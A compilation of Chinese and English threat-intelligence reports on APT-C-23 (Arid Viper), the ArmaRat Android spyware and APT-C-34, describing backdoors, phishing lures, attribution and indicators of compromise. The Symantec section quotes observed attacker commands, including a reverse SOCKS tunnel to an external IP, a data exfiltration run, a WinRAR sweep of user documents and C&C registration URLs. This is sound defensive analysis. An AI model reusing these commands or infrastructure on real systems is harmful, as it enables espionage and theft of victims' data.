写留言 取消 留言 我的留言 写留言 正在加载 展开我的留言 留言被精选后将公开 精选留言 写留言 写留言 正在加载 已无更多数据 发消息 关闭 写留言 提交 更多 正在加载 表情 正在加载 留言360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
APT-C-23（双尾蝎）又被称为AridViper 、Micropsia、FrozenCell、Desert Falcon，攻击范围主要为中东地区相关国家的教育机构、军事机构等重要领域，巴勒斯坦教育机构、军事机构等重要领域，以窃取敏感信息为主 的网络攻击组织。 具备针对Windows与Android双平台的攻击能力。 从2016年 5月对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。
攻击平台主要包括Windows与Android，Android端后门程序功能主要包括定位、短信拦截、电话录音等，并且还会收集文档、图片、联系人、短信等情报信息，PC 端后门程序功能包括收集用户信息上传到指定服务器、远程下载文件以及远控，后门程序主要伪装成文档、播放器、聊天软件以及一些特定领域常用软件，通过鱼叉或水坑等攻击方式配合社会工程学手段进行渗透，向特定目标人群进行攻击。
以前的双尾蝎样本大多采用 VC 版本、Delphi 版本，很少见到使用公开商业RAT组件进行攻击，此次 发 现 的样本 可能是该组织进攻方式的演变，也可能是双尾蝎组织内部出现了新的分支成员所采用的攻击手法。
我们最早通过一个名为“ تسريب - اجتماع - القائد - محمد - دحلان - و - المخابرات - المصريه .pdf（Mohammed Dahlan 指挥官和埃及情报会议 (MoM) 泄漏.pdf）”的文档，Mohammed Dahlan是巴勒斯坦政治家，曾担任巴勒斯坦权力机构在加沙的预防性安全部队的负责人。文档内容如下图所示：
通过文档我们关联到了双尾蝎与之前攻击不太相同的活动，此次攻击行动直接把商业 RAT伪装成Threema诱使用户点击打开，Threema是瑞士开发的一款付费的开源端到端加密即时通讯应用程序。
1.伪装Threema通讯软件
1.1 伪装T hreema图 标
1.2 Dropper
自身是一个 drooper程序，内部隐藏加密后的PE数据，首先创建互斥体。
通过解密并加载程序集，运行第二层加载器。
1.4 后门组件
最终加载执行的是后门程序 QusarRAT ，该后门程序被高度混淆。 Quasar是使用C＃编写远程管理工具，由于其开源，功能丰富的特性，经常被黑客用于各种网络攻击活动 ，主要功能如下
获取目标计算机系统信息
浏览器数据
植入其他攻击组件
2.伪装成windows的server.exe程序
2.1加载器
样本首先提取资源中的数据，异或解密并解压缩。
将程序自身拷贝到进程中，并将新的程序集 netmodule模块 加载到自身进程，附到PE文件后面。
3.1加载器
进一步我们关联到一个可能是双尾蝎组织比较早期的样本，当恶意样本运行会弹出提示：“由 agile net保护器的试用版本加密，无法在其他机器上运行。” 。
样本也会从资源里面解密后续的 payload 。
3.2 后门组件
最终同样调用 njrat 。
houdini RAT
溯源中我们还发现了 houdinirat的脚本木马，这在apt-c-23的以往攻击中从来没有见过。
Houdini RAT由个人编写，国外安全厂商认为作者来自阿尔及利亚，并且通过共享代码库发现该RAT与njw0rm和njRAT / LV的作者njq8有联系，曾被用于针对国际能源行业的针对性攻击 ， 其主要功能如下：
执行指定命令
更改恶意软件配置。 例如，动态DNS名称
从系统中删除恶意软件并清除所有快捷方式.lnk
将网站上托管的文件复制到受害者
枚举磁盘信息
枚举所有文件和目录
cmd命令
删除指定文件或目录
关闭指定进程
代码片段如下图所示：
中东地区局势动荡复杂，黑天鹅事件频发，双尾蝎 APT组织 在去年多次 以巴勒斯坦选举热点信息为诱饵的 进行攻击活动 。
伪装常用软件麻痹用户是 APT攻击 的 重要手段，大多数用户安全意识不强，很容易被伪装 的软件 所迷惑，在毫无防范的情况下被攻陷，进而泄漏机密文件、重要情报 。
360 高级威胁研究院
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑
不看此公众号
【已复现】Apache Tomcat 拒绝服务漏洞(CVE-2022-29885)安全风险通告 【已复现】Apache Tomcat 拒绝服务漏洞(CVE-2022-29885)安全风险通告 ... 奇安信 CERT 不喜欢 不看的原因 确定
内容质量低
不看此公众号
海莲花(OceanLotus)学习记录（一） 海莲花(OceanLotus)学习记录（一） ... 雷神众测 不喜欢 不看的原因 确定
内容质量低
不看此公众号
写留言 取消 留言 我的留言 写留言 正在加载 展开我的留言 留言被精选后将公开 精选留言 写留言 写留言 正在加载 已无更多数据 发消息 关闭 写留言 提交 更多 正在加载 表情 正在加载 留言双尾蝎（奇安信内部跟踪编号：APT-Q-63）是一个长期针对中东地区的高级持续威胁组织，其最早于2017年被披露。该组织至少自2016年5月起，持续针对巴勒斯坦教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主的网络攻击组织，开展了有组织，有计划，有针对性的攻击。其攻击行业包括基础设施，国防、教育、政府、媒体、交通等。攻击的国家包括但不限于美国，韩国，巴勒斯坦，日本，瑞典、以色列等。
双尾蝎的Android端攻击非常活跃，恶意样本具有高隐匿和强远控的特点，一直备受我们的关注。其在Android端的攻击主要采用伪装成聊天软件的方式进行投递和诱导安装，而在受害者设备上则通过隐藏图标、变换为Google全家桶图标和安装官方聊天软件等手段进行隐匿和持久化。
近日，奇安信病毒响应中心移动安全团队捕获到该组织一款新型恶意样本，其在使用经典武器库的同时，集成了最新的开源Android
RAT武器库，借助SMS和FCM服务，实现了复合型的更强的远程控制功能。
2、 关闭系统&设备厂商安全软件、安装和本身通知：
监控的应用包名包含字段包括google、android、security、system、securitylogagent、com.miui.securitycenter、app.lite.bot（应用自身）及com.google.android.packageinstaller。诱导申请权限如下图：
XHunter是一个新的开源Android
RAT武器，包含Client和Server，Client项目创建于2020年8月份，并持续更新至今，Server项目创建于2022年7月。此恶意样本采用了最新版的Client-Server服务，此武器使用C&C地址为https://luauasar.herokuapp.com， 其示例功能如下图：
此恶意样本使用功能如下：
MobiHok属于经典的Android
RAT武器，此恶意样本使用了最新的V6版本，新增了截屏相关的功能。此模块采用SMS下发指令，C&C地址为http://www.mobihok.net/ch/ch2.php?ssl=OEWM63UXM5P3LQREFS2EQ7F80VKNJK。 远控指令功能列表如下：
JW是一个目前未知的Android
RAT武器，具有丰富的恶意行为功能。此模块采用FCM下发指令，C&C地址为https://donald-grigg.site/api/FZnW8Y。 远控指令功能列表如下：
VolatileVenom是该组织旧版样本所使用的武器,此处用于总结和对比，主要也是通过SMS和FCM下发指令。 SMS远控指令功能列表如下： FCM远控指令功能列表如下：
双尾蝎组织在Android端的攻击方式主要是伪装为聊天软件和升级工具，且其使用Google
Cloud时会创建其伪装的目标聊天软件项目，以便于管理。此新型恶意样本伪装的目标聊天软件项目为BOTIM，它是一款高清视频通话和短信应用，GP下载量5000万+。
目前，基于奇安信自研的猫头鹰引擎和威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、奇安信天狗漏洞攻击防护系统、天擎、天机、天守、天眼高级威胁检测系统、奇安信NGSOC（态势感知与安全运营平台）、奇安信监管类态势感知等，都已经支持对此类攻击的精确检测。APT-C-23（双尾蝎）组织，是一个针对巴以地区的教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主的网络攻击组织。攻击平台主要包括 Windows 与 Android。该组织的攻击行动最早可追溯到2016年，近年来该组织活动频繁不断被数个国内外安全团队持续追踪和披露。
2020年2月，以色列国防军发布推文称，他们成功防御了哈马斯利用社交媒体伪装成美女针对色列国防军的一系列网络攻击行动，并且以色列情报部门采取了相应的反制措施，入侵并摧毁了哈马斯的攻击系统。 其中针对以色列国防军发起网络攻击的组织被认为是APT-C-23（双尾蝎）组织。
近期，360烽火实验室再次发现哈马斯最新的攻击行动，本次攻击行动中使用的样本与以色列国防军披露的样本属于同源家族，该攻击行动开始于2022年6 月，至今仍然处于活跃状态。 与以往不同的是，本次攻击行动中使用的攻击样本利用重打包技术将恶意应用作为子包打包进合法的应用。
进一步分 析发现，本次攻击行动与《 针对巴以地区围绕卡塔尔世界杯的攻击行动 》报告中攻击组织存在较大关联，由此我们认为两次攻击行动为同一攻击组织所为，即APT-C-23（双尾蝎）组织 。
本次攻击行动中主要使用钓鱼网站进行载荷投递，我们捕获到APT-C-23（双尾蝎）组织创建的两个钓鱼网站。
OPlayer是一个专业的视频播放工具，也是一个功能齐全的文件管理器，在Google Play上需要付费下载，其下载量超过10万。APT-C-23（双尾蝎）组织修改合法的OPlayer应用的名称和图标，并制作了相应的钓鱼网站进行载荷投递，如图1所示，钓鱼网站的证书信息如图2所示。
图1 钓鱼网站blaxaplayer.com
图2钓鱼网站证书信息
Align It是一款流行的棋盘游戏，在Google Play 上的下载量超过百万。APT-C-23（双尾蝎）组织使用同样的手法修改合法Align It游戏的名称和图标，并制作了相应的钓鱼网站进行载荷投递，如图3所示，钓鱼网站的证书信息如图4所示。
图3 钓鱼网站www.bbalignit.com
图4 钓鱼网站www.bbalignit.com证书信息
通过钓鱼网站证书信息的有效期，我们认为本次攻击行动开始于2022年6月。
2.恶意载荷分析
样本利用重打包技术，将包含恶意功能的应用作为子包插入合法的应用中，并修改合法应用的代码，诱导用户安装恶意子包，然后在后台运行恶意子包，相关代码如图5所示，其运行界面如图6所示。
图5 修改合法应用的代码，诱导用户安装运行恶意子包
图6 样本运行界面
恶意子包运行后使用MQTT协议连接服务器，如图7所示。连接服务器成功后，将一直保持在线状态，等待远程服务器下发指令，根据远控指令执行相应的功能，其远控指令对应的功能如图8所示。
图7 MQTT协议连接服务器
图8 远控指令对应的功能
恶意子包除了获取设备信息外，其他恶意功能通过动态加载远程下发的dex实现，如图9所示。
图9 动态加载dex
由于我们没有捕获到对应的dex文件，暂时无法判断其具体恶意功能，但是根据恶意子包已有的代码，我们认为该恶意子包具有窃取通话录音功能，如图10所示。
图10 执行dex中的恶意功能
二、归属关联
1.归属研判
我们将本次攻击行动归属为APT-C-23（双尾蝎）组织，主要基于以下三点。
（1）. 本次攻击行动中的样本与色列国防军披露的样本包结构基本一致，并且大部分类名也相同，如图11所示。
图11 以色列国防军披露的包结构（左）和本次攻击行动样本包结构（右）
(2）. 本次攻击行动中样本使用的网络协议、加密方式、代码逻辑与色列国防军披露的样本基本一致，图12为以色列国防军揭露的样本远控指令代码，图13为本次攻击行动中样本远控指令代码。
图12 以色列国防军披露的样本远控指令代码
图13 本次攻击行动中样本远控指令代码
（3）. 本次攻击行动中使用的恶意样本为APT-C-23（双尾蝎）组织独有的，相关恶意代码尚未发现其他攻击组织使用。
在《针对巴以地区围绕卡塔尔世界杯的攻击行动》报告中，由于缺少关键情报，只能猜测攻击组织应该归属为巴以地区。我们发现本次攻击行动中钓鱼网站获取APP下载地址的js源码文件名以及代码与《针对巴以地区围绕卡塔尔世界杯的攻击行动》报告中的完全相同，如图14和图15所示，基于此我们认为两次攻击行动的攻击组织相同，均为APT-C-23（双尾蝎）组织。
图14《针对巴以地区围绕卡塔尔世界杯的攻击行动》中获取APP下载地址源码
图15 本次攻击行动中获取APP下载地址源码
A PT-C-23（双尾蝎）组织本次攻击行动中利用重打包技术将恶意子包隐藏于合法应用中，在增强隐蔽性的同时，也减少了开发成本，使其可以专注于恶意功能开发； 我们发现本次活动中使用的攻击样本已经趋于稳定状态，表明该组织已经成熟的掌握了该项技术，或许后续的攻击样本伪装的对象类型会越来越多样化 。
MD5 cd7c502f57f70b66e6ca11a451a6d1c0
ddf033245d5b7001ac67f67361db80c9
442f302777d10e106614013d85d74230
00e8399ee027ed4c8378d0e230ed6dd2
e69169bbfd071e3d0e34d6da96571453
8bdc9ba843ade8f5cd059ce346e8617c
C&C
www.qualityanysolution.com
www.newbestmethod.com
钓鱼网站 https://blaxaplayer.com/
https://www.bbalignit.com/
https://play.google.com/store/apps/details?id=com.olimsoft.android.oplayer.pro
https://play.google.com/store/apps/details?id=com.millgame.alignit
https://twitter.com/IDF/status/1228959737305292800
360 烽火实验室
360烽火实验室致力于移动恶意软件分析、移动灰黑产研究、移动威胁预警、移动APT的发现与追踪等移动安全领域的深入研究。作为全球顶级移动安全生态研究实验室，360烽火实验室在全球范围内不仅首发了多篇具备国际影响力的移动安全生态研究成果，并且成功狩猎了蔓灵花、拍拍熊等多个APT组织针对我国及境外重要目标的攻击活动。实验室在为360手机卫士、360手机助手、360加固保等公司产品提供核心安全数据的同时，也为科研单位、手机厂商、应用商店及上百家国内外合作伙伴提供了移动应用安全检测服务，全方位守护移动安全The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories , is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.
While the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, by Broadcom Software , focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017.
Background
Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices.
Mantis is widely accepted to be linked to the Palestinian territories. While other vendors have linked the group to Hamas , Symantec cannot make a definitive attribution to any Palestinian organization.
In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.
Attack chain
The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network.
The following is a description of how one of those three toolsets was used:
The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444.
The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty, a publicly available SSH client , using Certutil and BITSAdmin
Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name:
csidl_common_appdata\systempropertiesinternationaltime\systempropertiesinternationaltime.exe
csidl_common_appdata\windowsnetworkmanager\windowsnetworkmanager.exe
csidl_common_appdata\windowsps\windowsps.exe
On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address:
CSIDL_COMMON_APPDATA\windowsservicemanageav\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED]
On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.
The following day, December 21, RAR was executed to archive files on another infected computer.
Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers).
On December 28, Micropsia was used to run windowspackages.exe on three more infected computers.
On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers.
On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear.
On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\hostupbroker\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file:
CSIDL_COMMON_APPDATA\windowsupserv\windowsupserv.exe -f CSIDL_COMMON_APPDATA\windowspackages\01-04-2023-15-13-39_getf.rar
On January 9, Arid Gopher was used to execute two unknown files on a single computer:
csidl_common_appdata\teamviewrremoteservice\teamviewrremoteservice.exe
The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.
Micropsia
Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths:
csidl_common_appdata\microsoft\dotnet35\microsoftdotnet35.exe
csidl_common_appdata\microsoftservicesusermanual\systempropertiesinternationaltime.exe
csidl_common_appdata\systempropertiesinternationaltime\systempropertiesinternationaltime.exe
csidl_common_appdata\windowsnetworkmanager\windowsnetworkmanager.exe
csidl_common_appdata\windowsps\windowsps.exe
Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included:
Arid Gopher (file names: networkvirtualizationstartservice.exe, networkvirtualizationfiaservice.exe, networkvirtualizationseoservice.exe)
Reverse SOCKs Tunneler (aka Revsocks) (file name: windowsservicemanageav.exe)
Data Exfiltration Tool (file name: windowsupserv.exe)
Two unknown files, both named hostupbroker.exe
Unknown file named windowspackages.exe
In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration:
"%PROGRAMDATA%\Software Distributions\WinRAR\Rar.exe" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 "%PROGRAMDATA%\Software Distributions\Bdl\LMth__C_2023-02-13 17-14-41" "%USERPROFILE%\*.xls" "%USERPROFILE%\*.xlsx" "%USERPROFILE%\*.doc" "%USERPROFILE%\*.docx" "%USERPROFILE%\*.csv" "%USERPROFILE%\*.pdf" "%USERPROFILE%\*.ppt" "%USERPROFILE%\*.pptx" "%USERPROFILE%\*.odt" "%USERPROFILE%\*.mdb" "%USERPROFILE%\*.accdb" "%USERPROFILE%\*.accde" "%USERPROFILE%\*.txt" "%USERPROFILE%\*.rtf" "%USERPROFILE%\*.vcf"
Arid Gopher
Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components:
7za.exe – A copy of the legitimate 7-Zip executable
AttestationWmiProvider.exe – A tool that sets a “run” registry value
ServiceHubIdentityHost.exe – A copy of legitimate Shortcut.exe executable from Optimum X
Setup.env – Configuration file
Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor.
When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands:
Connects to: http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134) - likely to register device
Followed by: http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands
Connects to: http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32) - likely to register device
Followed by: http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands360烽火实验室
一、 主要发现
2016年7月起至今，360烽火实验室发现一起针对伊朗Android手机用户长达两年之久的间谍活动。截至目前我们一共捕获了Android 样本18个，涉及的 C&C 域名5个。
2016 年7月，我们捕获了第一个Android平台下伪装成“Telegram Channel Assistance”应用的木马，在此后的两年中，我们又先后捕获了与此相关的数十个变种。我们发现，该木马主要伪装成社交、系统、色情视频及Adobe flash player等应用，借助社交软件Telegram进行传播。
木马的恶意行为演变过程大致分为4个版本，最初版本会伪造联系人，获取手机基本信息，静默拍照，拦截并转发指定短信信息。随着版本变化，木马的恶意行为不断增多，最新版本存在20多种恶意行为。入侵成功后攻击者可以完全控制用户手机，并对用户手机进行实时监控。
由于该木马演变过程中C&C及代码结构均出现“arma”关键字，所以我们将该木马家族命名为“ArmaRat”。
二、 受影响地区
2016年7月起至今，根据我们的监测受到ArmaRat木马影响的地区主要是伊朗，占比高达91%。
三、 感染链
通过对感染的用户手机进一步分析，我们发现了ArmaRat木马的传播方式。攻击者借助社交软件Telegram分享经过伪装的ArmaRat木马，用户下载安装运行后，会释放伪装成系统应用的恶意子包，诱导用户进行安装操作。
四、 伪装对象
ArmaRat木马主要伪装成社交、系统、色情视频及Adobe flash player等应用，其中还包括伪装成伊朗特色节日“诺鲁孜节”的应用。诺鲁孜节是伊朗、中亚及我国部分少数民族的节日，是为进入春耕生产，绿化、美化、净化环境做准备的节日。
我们根据捕获到的ArmaRat木马变种的打包时间，恶意行为以及代码结构，将其演变过程分为4个版本。
从版本1到版本4，ArmaRat木马功能不断增多，下图为每个版本的功能的迭代变化情况。
另外，我们发现与普通的恶意软件行为相比一些恶意行为极为少见，比如伪造Telegram钓鱼页面。
窃取Telegram验证码短信
伪造联系人，将控制号码9850001333125467伪装成“Telegram”或者“HAMRAHAVVAL”（疑似与伊朗电信提供商MCI相关）插入到联系人，推测为了更好的隐藏控制号码发送短信的行为记录。
六、 C&C分析
我们以时间轴和不同颜色的方式来展示ArmaRat木马的C&C变化情况：
红色部分：C&C前面几乎都是以“mcyvpn”开头，不同时间段URL的path部分分别是 “tgp”、“armaphone”，并且更换了新域名；
紫色部分：URL的path部分出现关键字“arma”，其中2017年2月出现了“192.168.92.10”的测试IP，之后的一段时间path部分均为“armaspyware”；
ArmaRat木马的C&C主要使用动态域名，动态域名占比82%。动态域名可以将任意变换的IP地址绑定给一个固定的二级域名。不管这个线路的IP地址怎样变化，因特网用户还是可以使用这个固定的域名，来访问或登录用这个动态域名建立的服务器。分析人员和网络执法人员主要根据IP地址对木马服务器进行定位，如果木马使用动态域名的方式，即意味着木马服务器的IP地址时刻在改变，由此增加了追踪的难度。
ArmaRat木马C&C与样本关系如下图，可以看出样本与C&C之间通过一些特殊字符“mcyvpn”、“arma”、“spydb_api.php”进行关联的整体情况。
七、 总结
经过我们分析，ArmaRat木马长达两年的间谍活动背后的攻击者，回传隐私信息使用伊朗区号98，远控的短信指令包含波斯语，通过伪装的软件可以看出攻击者了解伊朗的传统节日。
近年来伊朗局势每况愈下，社会环境的动荡带来了更多负面效果，网络攻击日渐频繁，国外安全公司不断曝出TeleRAT、HeroRat等针对伊朗用户的攻击活动，这次发现的ArmaRat是又一实例，我们预测类似这种攻击活动还将继续，伴随着伊朗局势的不稳定会更加严重。
本文链接： https://blogs.360.cn/post/analysis_of_ArmaRat.html
-- EOF --
360烽火实验室（360 Beaconlab）
2018-09-07 03:44:25
，添加在分类Hacking Team是为数不多的几家在全世界范围出售商业网络武器的公司之一。2015年7月5日，Hacking Team遭遇了大型数据攻击泄漏事件，该公司已经工程化的漏洞和后门产品代码几乎被全部公开。该事件泄露包括了Flash、Windows字体、IE、Chrome、Word、PPT、Excel、Android的未公开0day漏洞，覆盖了大部分的桌面电脑和超过一半的智能手机。泄露的网络武器被黑客大肆利用，随后Hacking Team公司也宣布破产被并购。2015年后，有关HackingTeam的活动突然销声匿迹。
2018年在乌俄两国突发“刻赤海峡”事件的危机时刻，360高级威胁应对团队在全球范围内率先发现了一起针对俄罗斯的APT攻击行动，攻击者精心准备了一份俄文内容的员工问卷的诱饵文档，根据文档内容推测，攻击所指向的是俄罗斯总统办公室所属的医疗机构，结合被攻击目标医疗机构的职能特色，我们将APT攻击命名为了“毒针”行动。我们无法确定“毒针”行动的动机和攻击身份，但攻击所指向的医疗机构特殊背景，使攻击表现出了明确的定向性，同时攻击发生在“刻赤海峡”危机的敏感时段，也为攻击带上了一些未知的政治意图。
我们发现“毒针”行动使用了Flash 0day漏洞CVE-2018-15982 ，后门程序疑似自于意大利网络武器军火商HackingTeam，所以不难推测其背后的APT组织可能经常采购商业网络武器。种种迹象表明HackingTeam的生意并没有消失，这引发了我们对HackingTeam网络武器再次追踪的兴趣，我们尝试针对HackingTeam网络武器进行关联追踪，意料之外地发现了一支未被披露过的俄语系APT组织，该组织的活动主要影响中亚地区，大部分集中在哈萨克坦国境内。因为是全球首次发现披露，我们参照中亚地区擅长驯养猎鹰进行狩猎的习俗特性，将该组织命名为黄金雕（APT-C-34）。
在针对HackingTeam后门程序研究过程中，我们从360的大数据中找到了更多的在野攻击中使用的HackingTeam后门程序，通过对程序的同源性进行分析，关联扩展发现了大量不同种类的后门程序。通过持续一年的观察和一步一步的深入调查分析，我们挖掘了更多的细节信息，逐渐整合形成了黄金雕（APT-C-34）组织的全貌
黄金雕（APT-C-34）组织的受害者广泛分布中亚地区，主要活跃在哈萨克斯坦国境内，涉及各行各业，包括教育、航空航天、政府机关、媒体工作人员等，其中部分受害者有中国背景，涉及我方与哈萨克合作项目，而极少数的人位于西北部地区。该组织背后疑似有政府实体机构支持其行动。
在技术手段上，除了传统的后门程序，黄金雕（APT-C-34）组织还采购了HackingTeam和NSO的商业间谍软件。我们发现该组织的HackingTeam 后门版本号为10.3.0，与“毒针”行动的后门版本号相同。在攻击方式上，除了使用了传统的社会工程学等手段外，该组织也大量使用了物理接触的方式投递恶意程序（例如U盘等）；除此之外，其也有使用特殊侦查设备对目标直接进行窃听和信号获取的迹象。
攻击影响范围
对受害者进行分析统计，绝大部分受害者都集中在哈萨克斯坦国境内，涉及各行各业，从相关数据中看，包括教育行业、政府机关人员、科研人员、媒体工作人员、部分商务工业、军方人员、宗教人员、政府异见人士和外交人员。
波及我国的主要人员绝大部分也集中在哈萨克斯坦国境内，包括留学生群体、驻哈萨克斯坦教育机构、驻哈萨克斯坦相关工程项目组，极少数的受害者分布在我国西北部地区，涉及政府工作人员。
在该组织的C&C服务器上，我们发现了大量的根据哈萨克斯坦城市命名的文件夹，包含了大部分哈萨克斯坦的主要城市。
文件夹名称
在对应的城市命名的文件夹下，有相关的HackingTeam后门程序，其使用后门程序时针对不同城市的目标使用不同的配置。
该组织的后门程序会将收集的受害者信息加密后上传至C&C服务器，在服务器上每一个受害者的信息都会用一个文件夹进行标识。如下图所示：
典型受害者分析
通过对上传文件进行解密，我们发现了大量该组织从受害者计算机上窃取的文档和数据。
典型的中国受害者，某驻哈教育机构的中方人员。
主要攻击方式分析
我们发现黄金雕（APT-C-34）组织除了常规的社会工程学攻击手段，也喜欢使用物理接触的手段进行攻击，同时还采购了无线电硬件攻击设备。
社会工程学攻击方式
该组织制作了大量的伪装的文档和图片文件作为鱼叉攻击的诱饵，这些文件通过伪装图标诱导用户点击，这些文件实际上是EXE和SRC后缀的可执行文件，同时会释放弹出真正的文档和图片欺骗受害者。
诱饵文档的内容五花八门，有华为路由器的说明书、伪造的简历和三星手机说明书等。
物理接触攻击方式
黄金雕（APT-C-34）组织疑似喜欢使用U盘作为载体，通过物理接触目标的方式进行攻击，部分受害者曾经接入过包含恶意程序和安装脚本的U盘。如下图所示，其中以install开头的bat文件为恶意程序安装脚本。
同时也使用了HackingTeam的物理攻击套件，该套件需要通过恶意硬件物理接触目标机器，在系统引导启动前根据系统类型植入恶意程序，支持Win、Mac和Linux平台。
无线电监听攻击方式
该组织采购了一家俄罗斯公司“YURION”的硬件设备产品，该公司是一家俄罗斯的安全防务公司，专门出售无线电监听、窃听等设备，该组织有可能使用该公司的一些特殊硬件设备直接对目标的通讯等信号进行截取监听。
核心后门程序分析
本节将对黄金雕（APT-C-34）组织所使用的后门程序进行详细的分析，该组织的后门技术主要通过改造正规软件、自主研发和采购商业木马这三种方式进行。
正规远程控制软件改造
针对该组织恶意软件的相关分析中，我们发现了该组织改造正规的远程协助软件进行攻击，通过劫持后者实现对受害者的控制。
TeamViewer Hijacker
该组织通过DLL劫持改造的TeamViewer QuickSupport软件，当恶意DLL加载后会进行系统API Hook，进而隐藏正常的程序窗口，并将ID和Password发送到C&C服务器。
正常的TeamViewer QuickSupport由主程序、Teamviewer_Resource_fr.dll和tv.dll三个文件构成，该组织加入了一个后门dll程序将该软件改造成后门。后门替换了原有的tv.dll文件，将原有的功能库tv.dll重信命名为userinit.dll，同时伪造的tv.dll与原模块具有相同的导出表结构，再通过加载userinit.dll来支持原有逻辑。
伪造的tv.dll通过Inline Hook API ShowWindow 使正常TeamViewer窗口隐藏，并Hook SetWindowTextW 获取ID和Password。
上图为正常的TeamViewer QuickSupport程序窗口，伪装DLL通过Hook 系统API ShowWindow，并修改显示参数为SW_HIDE进而实现主程序窗口隐藏。
通过Hook API SetWindowsTextW来获取TeamViewer的ID和Password
随后构造Get请求，将Id和Password上传到C&C：
hxxp:// .ru/ /get .php? =1&n=31337&u=7&id=xx&pwd=xx&m=d4628443
另一方面，恶意程序会在目录下寻找名为msmm.exe和msmn.exe的文件，如果存在则通过WinExec执行，其主要功能为键盘记录和剪切板内容窃取。
查找名为 MSM?.DLL 的DLL文件，如果存在则会加载该DLL，执行Init导出函数，该DLL的功能也为键盘和剪切板记录。
值得注意的是，在伪装的DLL中，后部分代码使用了虚拟机进行保护,解析执行Bytecode。
RMS Hijacker
另一款改造后门通过劫持俄罗斯常用的远程控制软件RMS，实现对目标机器的控制。其功能与TeamViewer Hijacker相似。
自主研发Harpoon (Гарпун)后门
Haroon是黄金雕（APT-C-34）组织自主研发的一款针对特定用户的后门程序，使用Delphi实现。
我们获取了该后门的说明手册（如下图），该后门具备强大的信息收集功能，包括屏幕定时截图、录音、剪切板记录、键盘记录、特定后缀名文件偷取等功能。
以下是上述字段的中文翻译：
主要功能：
STS Harpoon程序提供以下功能：
键盘记录；
剪切板记录；
以预定的时间间隔获取目标计算机桌面上活动窗口截图；
列出对象计算机硬盘上给定目录的内容；
获取Skype登录名、联系人列表和聊天消息；
获取Skype和Google Hangouts通话对象和语音记录；
从麦克风录制声音，窃听；
从目标计算机复制指定的文件；
从对象计算机的可移动介质中自动复制文档文件；
将所有截获和复制的信息打包到加密的dat文件中，然后将它们保存到指定的目录中；
将获取的信息发送到指定的FTP；
运行程序或操作系统命令；
